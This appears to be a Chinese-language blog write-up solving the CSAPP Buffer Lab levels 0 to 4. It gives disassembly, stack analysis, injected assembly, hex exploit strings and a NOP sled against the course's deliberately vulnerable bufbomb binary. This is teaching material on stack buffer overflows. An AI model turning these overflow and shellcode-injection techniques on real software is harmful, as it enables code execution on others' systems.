---
layout: post
title:  "CSAPP-Buffer Lab"
date:   2019-2-7
desc: ""
keywords: ""
categories: [Cetus]
tags: [CSAPP]
icon: icon-html
---

# CSAPP-Buffer Lab

* #### Level0: Candle

  ```
  Your task is to get BUFBOMB to execute the code forsmoke when getbuf executes its return statement,rather than returning to test.Note that your exploit string may also corrupt parts of the stack notdirectlyrelated to this stage, but this will not cause a problem, since smokecauses the program to exit directly.
  ```

  调用smoke函数

  ```assembly
  080491f4 <getbuf>:
   80491f4:	55                   	push   %ebp
   80491f5:	89 e5                	mov    %esp,%ebp
   80491f7:	83 ec 38             	sub    $0x38,%esp
   80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
   80491fd:	89 04 24             	mov    %eax,(%esp)
   8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
   8049205:	b8 01 00 00 00       	mov    $0x1,%eax
   804920a:	c9                   	leave  #mov %ebp %esp     pop %ebp
   804920b:	c3                   	ret    
  ```

  gets获取数据到buf，buf的地址为`-0x28(%ebp)`

  | 返回地址 |
  | :------: |
  |   ebp    |
  |   buf    |
  |          |

  buf到返回地址的距离为0x28+0x4=0x2c

  gets对输入的数据没有限制，填充0x2c个字节再输入smoke地址覆盖返回地址

  smoke的地址为`0x08048c18`

  ```
  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 18 8c 04 08
  ```

  smoke的地址用小端法表示

  使用hex2row转化为字符串

  `./hex2raw < 0.txt|./bufbomb -u aidai`

  ![0](https://raw.githubusercontent.com/AiDaiP/images/master/CSAPP-Buffer%20Lab/0.png)

  

* #### Level1: Sparkler

  ```
  Similar to Level 0, your task isto get BUFBOMB to execute the code for fizz rather than returningto test. In this case, however, you must make it appear to fizz as if you havepassed your cookie as its argument. How can you do this?
  ```

  调用fizz，并使fizz的参数为userid对应的cookie

  fizz的地址为`0x08048c42`

  ```assembly
  08048c42 <fizz>:
   8048c42:	55                   	push   %ebp
   8048c43:	89 e5                	mov    %esp,%ebp
   8048c45:	83 ec 18             	sub    $0x18,%esp
   8048c48:	8b 45 08             	mov    0x8(%ebp),%eax
   8048c4b:	3b 05 08 d1 04 08    	cmp    0x804d108,%eax
   8048c51:	75 26                	jne    8048c79 <fizz+0x37>
   8048c53:	89 44 24 08          	mov    %eax,0x8(%esp)
   8048c57:	c7 44 24 04 ee a4 04 	movl   $0x804a4ee,0x4(%esp)
   8048c5e:	08 
   8048c5f:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
   8048c66:	e8 55 fd ff ff       	call   80489c0 <__printf_chk@plt>
   8048c6b:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
   8048c72:	e8 04 07 00 00       	call   804937b <validate>
   8048c77:	eb 18                	jmp    8048c91 <fizz+0x4f>
   8048c79:	89 44 24 08          	mov    %eax,0x8(%esp)
   8048c7d:	c7 44 24 04 40 a3 04 	movl   $0x804a340,0x4(%esp)
   8048c84:	08 
   8048c85:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
   8048c8c:	e8 2f fd ff ff       	call   80489c0 <__printf_chk@plt>
   8048c91:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
   8048c98:	e8 63 fc ff ff       	call   8048900 <exit@plt>
  ```

  参数的地址为0x8(%ebp)，fizz的返回地址在0x4(%ebp)

  fizz通过getbuf的返回地址调用，没有返回地址入栈，所以应填充四字节作为fizz的返回地址，然后再将cookie放置到0x8(%ebp)

  ```
  61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 42 8c 04 08 61 61 61 61 b0 b7 f4 67
  ```

  ![1](https://raw.githubusercontent.com/AiDaiP/images/master/CSAPP-Buffer%20Lab/1.png)

  

* #### Level2: Firecracker

  ```
  Similar to Levels0 and 1, your task is to get BUFBOMB to execute the code for bang rather than returningto test. Before this, however, you must set global variable global_value toyour userid’s cookie. Your exploit code should set global_value, push theaddress of bang on the stack, and then execute a ret instruction to cause ajump to the code for bang.
  ```

  把全局变量global_value的值修改为为cookie的值，调用bang

  bang的地址为`8048c9d`

  global_value是全局变量，不储存在栈中，只能通过赋值修改。

  global_value的地址为`0x804d100`

  在buf中写入赋值代码，getbuf返回到buf的地址执行代码

  在getbuf断，查看buf的地址

  ```
  0x80491fa <getbuf+6>      lea    eax, [ebp - 0x28] <0x55683508>
  ```

  buf的地址为`0x55683508`

  构造赋值代码

  ```assembly
  push   $0x8048c9d
  mov    $0x67f4b7b0,%eax
  mov    %eax,0x804d100
  ret  
  ```

  把bang的地址压入栈，把cookie的值赋给global_value，然后ret返回到bang

  `as 2.s -o 2.o`得到二进制文件再objdump -d 2.o反汇编

  ```assembly
     0:	68 9d 8c 04 08       	pushq  $0x8048c9d
     5:	b8 b0 b7 f4 67       	mov    $0x67f4b7b0,%eax
     a:	89 04 25 00 d1 04 08 	mov    %eax,0x804d100
    11:	c3                   	retq 
  ```

  ```
  68 9d 8c 04 08 b8 b0 b7 f4 67 89 04 25 00 d1 04 08 c3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 08 35 68 55
  ```

  ![2](https://raw.githubusercontent.com/AiDaiP/images/master/CSAPP-Buffer%20Lab/2.png)

  

* #### Level 3: Dynamite

  ```
  Your job for thislevel is to supply an exploit string that will cause getbuf to return yourcookie back to test, rather than the value 1. You can see in the code for testthat this will cause the program to go“Boom!.” Your exploit code should set your cookie asthe return value, restore any corrupted state, push the correct return locationon the stack, and execute a ret instruction to really return to test.
  ```

  getbuf返回到test，返回值为cookie，而且要恢复损坏的状态

  在getbuf断，查看%ebp和%ebp+4（返回地址）的值

  ```
  pwndbg> x $ebp
  0x55683530 <_reserved+1037616>:	0x55683560
  pwndbg> x $ebp+4
  0x55683534 <_reserved+1037620>:	0x08048dbe
  ```

  构造代码，修改返回值为cookie，恢复ebp原来的状态，跳转到原来的地址

  ```assembly
  push $0x08048dbe
  mov $0x67f4b7b0,%eax
  mov $0x55683560,%ebp
  ret
  ```

  ```
     0:	68 be 8d 04 08       	pushq  $0x8048dbe
     5:	b8 b0 b7 f4 67       	mov    $0x67f4b7b0,%eax
     a:	bd 60 35 68 55       	mov    $0x55683560,%ebp
     f:	c3                   	retq  
  ```

  ```
  68 be 8d 04 08 b8 b0 b7 f4 67 bd 60 35 68 55 c3 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 61 08 35 68 55
  ```

  ![3](https://raw.githubusercontent.com/AiDaiP/images/master/CSAPP-Buffer%20Lab/3.png)

  

* #### Level4: Nitroglycerin

  运行bufbomb时加上参数-n，其余要求和level3一样

  加上-n函数变为testn和getbufn，栈随机化，会调用5次testn，五次都要满足条件

  ```assembly
  08048e26 <testn>:
   8048e26:	55                   	push   %ebp
   8048e27:	89 e5                	mov    %esp,%ebp
   8048e29:	53                   	push   %ebx
   8048e2a:	83 ec 24             	sub    $0x24,%esp
   8048e2d:	e8 5e ff ff ff       	call   8048d90 <uniqueval>
   8048e32:	89 45 f4             	mov    %eax,-0xc(%ebp)
   8048e35:	e8 d2 03 00 00       	call   804920c <getbufn>
   8048e3a:	89 c3                	mov    %eax,%ebx
   8048e3c:	e8 4f ff ff ff       	call   8048d90 <uniqueval>
   8048e41:	8b 55 f4             	mov    -0xc(%ebp),%edx
   8048e44:	39 d0                	cmp    %edx,%eax
   8048e46:	74 0e                	je     8048e56 <testn+0x30>
   8048e48:	c7 04 24 88 a3 04 08 	movl   $0x804a388,(%esp)
   8048e4f:	e8 6c fa ff ff       	call   80488c0 <puts@plt>
   8048e54:	eb 46                	jmp    8048e9c <testn+0x76>
   8048e56:	3b 1d 08 d1 04 08    	cmp    0x804d108,%ebx
   8048e5c:	75 26                	jne    8048e84 <testn+0x5e>
   8048e5e:	89 5c 24 08          	mov    %ebx,0x8(%esp)
   8048e62:	c7 44 24 04 b4 a3 04 	movl   $0x804a3b4,0x4(%esp)
   8048e69:	08 
   8048e6a:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
   8048e71:	e8 4a fb ff ff       	call   80489c0 <__printf_chk@plt>
   8048e76:	c7 04 24 04 00 00 00 	movl   $0x4,(%esp)
   8048e7d:	e8 f9 04 00 00       	call   804937b <validate>
   8048e82:	eb 18                	jmp    8048e9c <testn+0x76>
   8048e84:	89 5c 24 08          	mov    %ebx,0x8(%esp)
   8048e88:	c7 44 24 04 62 a5 04 	movl   $0x804a562,0x4(%esp)
   8048e8f:	08 
   8048e90:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
   8048e97:	e8 24 fb ff ff       	call   80489c0 <__printf_chk@plt>
   8048e9c:	83 c4 24             	add    $0x24,%esp
   8048e9f:	5b                   	pop    %ebx
   8048ea0:	5d                   	pop    %ebp
   8048ea1:	c3                   	ret    
  ```

  ```assembly
  0804920c <getbufn>:
   804920c:	55                   	push   %ebp
   804920d:	89 e5                	mov    %esp,%ebp
   804920f:	81 ec 18 02 00 00    	sub    $0x218,%esp
   8049215:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
   804921b:	89 04 24             	mov    %eax,(%esp)
   804921e:	e8 d7 fa ff ff       	call   8048cfa <Gets>
   8049223:	b8 01 00 00 00       	mov    $0x1,%eax
   8049228:	c9                   	leave  
   8049229:	c3                   	ret    
   804922a:	90                   	nop
   804922b:	90                   	nop
  ```

  在getbufn断可以看出%ebp的地址和保存的值会变化，返回地址没有改变

  %ebp是随机的，但是%ebp和%esp的差是一定的，可以通过%esp恢复%ebp的值。

  %ebp=%esp + 0x24(sub    $0x24,%esp) + 0x4(push   %ebx)

  ```assembly
  movl $0x67f4b7b0,%eax
  movl %esp,%ebx
  addl $0x28,%ebx
  movl %ebx,%ebp
  push $0x08048e3a
  ret
  ```

  ```
     0:	b8 b0 b7 f4 67       	mov    $0x67f4b7b0,%eax
     5:	89 e3                	mov    %esp,%ebx
     7:	83 c3 28             	add    $0x28,%ebx
     a:	89 dd                	mov    %ebx,%ebp
     c:	68 3a 8e 04 08       	pushq  $0x8048e3a
    11:	c3                   	retq  
  ```

  还有一个问题，buf的地址不能确定，最后要覆盖的四字节的返回地址就不能确定。

  可以使用nop sled，在构造的代码之前加入nop指令(0x90)，返回到buf中任意地址都可以顺序执行nop指令直到遇到构造的代码

  在0x804921b断，查看eax的值，找到最高的地址填上就完事了

  ```
  90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 b8 b0 b7 f4 67 89 e3 83 c3 28 89 dd 68 3a 8e 04 08 c3 98 33 68 55
  ```

  ![4](https://raw.githubusercontent.com/AiDaiP/images/master/CSAPP-Buffer%20Lab/4.png)